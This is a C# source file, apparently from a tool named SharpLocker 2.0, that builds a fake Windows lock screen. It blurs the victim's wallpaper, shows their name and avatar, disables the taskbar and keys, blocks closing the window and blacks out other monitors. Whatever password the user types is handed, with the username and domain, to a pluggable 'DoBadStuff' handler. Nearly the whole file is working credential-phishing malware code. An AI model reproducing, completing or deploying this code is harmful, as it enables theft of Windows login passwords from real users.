using SharpLocker_2._0.Classes;
using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpLocker_2._0
{
    public partial class WindowsLogin : Form
    {
        #region "Variables and Stuff"

        private bool DenyClose { get; set; }
        private Interfaces.IDoBadStuff DoBadStuff;

        private const string PLACEHOLDER_TEXT = "Password";

        #endregion

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
#if !DEBUG
                e.Cancel = DenyClose;
#endif
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        #endregion

        private void LoginButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) return;

            DenyClose = false;
#if !DEBUG
                KeyPressHandler.Enable();
#endif
            DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);

            Close();
        }

        #region "Password"

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            if (PasswordTextBox.Text == PLACEHOLDER_TEXT)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == PLACEHOLDER_TEXT)
            {
                tb.UseSystemPasswordChar = true;
                tb.Font = new Font("Microsoft Sans Serif", 23.25f);
                tb.Text = tb.Text.Substring(tb.Text.Length - 1);
                tb.ForeColor = SystemColors.WindowFrame;
                tb.Select(1, 0);
            }
        }

        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == PLACEHOLDER_TEXT) PasswordTextBox.Select(0, 0);
        }

        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = PLACEHOLDER_TEXT;
            PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
            PasswordTextBox.ForeColor = SystemColors.ControlLight;
            PasswordTextBox.Select(0, 0);
        }

        #endregion

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            BlurBackground();
            PasswordTextBox.Focus();
        }

        private void Initialize()
        {
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeTaskbar();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
            InitializeOtherUsers();
        }

        private void InitializeMisc()
        {
            DenyClose = true;
            CapsLockLabel.Visible = false;
#if DEBUG
            TopMost = false;
#else
                TopMost = true;
#endif

        }

        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        private void InitializeBadStuff()
        {
            DoBadStuff = new Interfaces.BadStuffLoader().Get();

            if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
        }

        private void InitializeTaskbar()
        {
#if !DEBUG
                KeyPressHandler.Disable();
#endif
        }

        private void InitializeUserLabel()
        {
            try
            {
                UserNameLabel.Text = UserPrincipal.Current.DisplayName;
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));

        private void InitializeBackground() => BackgroundImage = GetBackgroundImage();

        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(2);
        }

        private void InitializeUserIcon()
        {
            SetUserIconByName(Environment.UserName, UserIconPictureBox);
        }

        private Image GetUserIconFromPath(string fileEnding, string path)
        {
            try
            {
                foreach (string f in Directory.GetFiles(path))
                {
                    if (!f.EndsWith($".{fileEnding}")) continue;
                    if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                    return Image.FromFile(f);
                }

                return null;
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        private void SetUserIconByName(string username, PictureBox pb)
        {
            Image img = null;

            string path = Path.GetTempPath();

            if (string.IsNullOrEmpty(username) || username == "Other User")
                img = Properties.Resources.defaultAvatar;

            if (img is null)
                img = GetUserIconFromPath("bmp", path);

            if (img is null)
                img = GetUserIconFromPath("png", path);

            if (img is null)
                img = GetUserIconFromPath("jpg", path);

            if (img is null)
                img = Properties.Resources.defaultAvatar;

            pb.Image = ResizeImage(img, pb.Width, pb.Height);

            GraphicsPath gp = new GraphicsPath();
            gp.AddEllipse(0, 0, pb.Width - 1, pb.Height - 1);
            Region rg = new Region(gp);
            pb.Region = rg;
        }

        public Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

                using (var wrapMode = new ImageAttributes())
                {
                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }

            return destImage;
        }

        private void InitializeOtherScreens()
        {
#if !DEBUG
                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                {
                    new Task(() => BlackScreen(screen)).Start();
                }
#endif
        }

        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1;
            e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                PasswordTextBox.Location.X - offset,
                PasswordTextBox.Location.Y - offset,
                PasswordTextBox.Width + offset,
                PasswordTextBox.Height + offset));
        }

        private void InitializeOtherUsers()
        {
            AddChangeUserPanel("Other User", 0);
            AddChangeUserPanel(UserPrincipal.Current.DisplayName, 1);
        }

        private void AddChangeUserPanel(string user, int panelCount)
        {
            int panelX = 12;
            int panelY = 388;
            int panelWidth = 200;
            int panelHeight = 50;

            int pictureBoxOffset = 8;
            int pictureBoxX = pictureBoxOffset;
            int pictureBoxHeight = (int)(panelHeight * 0.9);
            int pictureBoxY = (int)((panelHeight - pictureBoxHeight) * 0.58);
            int pictureBoxWidth = pictureBoxHeight;

            int buttonX = pictureBoxWidth + pictureBoxOffset;
            int buttonY = 0;
            int buttonWidth = panelWidth - pictureBoxWidth;
            int buttonHeight = panelHeight;

            Panel p = new Panel()
            {
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                Location = new Point(panelX, panelY + panelHeight * panelCount * -1),
                Size = new Size(panelWidth, panelHeight),
                BorderStyle = BorderStyle.None,
                BackColor = Color.Transparent,
                BackgroundImageLayout = ImageLayout.Stretch
            };

            if (!(user is null) && user == UserPrincipal.Current.DisplayName) p.BackgroundImage = Properties.Resources.defaultButtonBackground;

            p.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            p.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            PictureBox pb = new PictureBox()
            {
                BackColor = Color.Transparent,
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                BackgroundImageLayout = ImageLayout.Stretch,
                Size = new Size(pictureBoxWidth, pictureBoxHeight),
                Location = new Point(pictureBoxX, pictureBoxY)
            };

            pb.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            pb.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            Button b = new Button()
            {
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                Size = new Size(buttonWidth, buttonHeight),
                Location = new Point(buttonX, buttonY),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 13),
                ForeColor = Color.White,
                Text = user,
                TextAlign = ContentAlignment.MiddleLeft
            };

            b.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            b.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            b.FlatAppearance.BorderSize = 0;
            b.FlatAppearance.MouseOverBackColor = Color.Transparent;
            b.FlatAppearance.MouseDownBackColor = Color.Transparent;

            SetUserIconByName(user, pb);

            p.Controls.Add(pb);
            p.Controls.Add(b);
            Controls.Add(p);
        }
    }

    #endregion

}
